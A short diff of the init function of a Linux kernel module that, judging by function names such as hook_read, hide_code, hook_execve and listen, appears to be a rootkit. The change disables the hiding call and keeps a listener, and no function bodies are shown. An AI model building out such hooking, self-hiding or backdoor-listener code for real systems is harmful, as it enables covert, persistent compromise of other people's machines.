@@ -18,8 +18,7 @@ static int __init mod_init(void)
 {
  // hook_read();
 
-  hide_code();
-  //hook_execve();
+  //gide_code();
   listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
